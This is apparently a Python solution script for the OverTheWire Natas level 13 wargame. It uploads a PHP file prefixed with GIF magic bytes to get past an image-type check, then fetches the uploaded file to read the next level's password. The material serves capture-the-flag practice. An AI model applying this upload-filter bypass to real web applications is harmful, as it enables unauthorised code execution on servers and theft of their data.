import requests

import natas12
from helpers import between


def solution() -> str:
    url = "http://natas13.natas.labs.overthewire.org"
    username = "natas13"
    password = natas12.solution()

    # This is pretty much the same as natas12 except there is an added
    # check for the file type using the "exif_imagetype" function.
    # This just checks the first few bytes of the file, so the natas13.php
    # payload has "GIF" at the beginning of the file.

    file_name = "natas13.php"
    files = {
        "MAX_FILE_SIZE": (None, "1000"),
        "filename": (None, file_name),
        "uploadedfile": (file_name, open(file_name, "rb")),
        "submit": (None, "Upload+File"),
    }
    r = requests.post(url, auth=(username, password), files=files)
    start = 'The file <a href="'
    end = '">upload/'
    upload_path = between(r.text, start, end)
    upload_url = "{url}/{path}".format(url=url, path=upload_path)
    r = requests.get(upload_url, auth=(username, password))
    natas14_password = r.text.strip().replace("GIF", "")
    return natas14_password
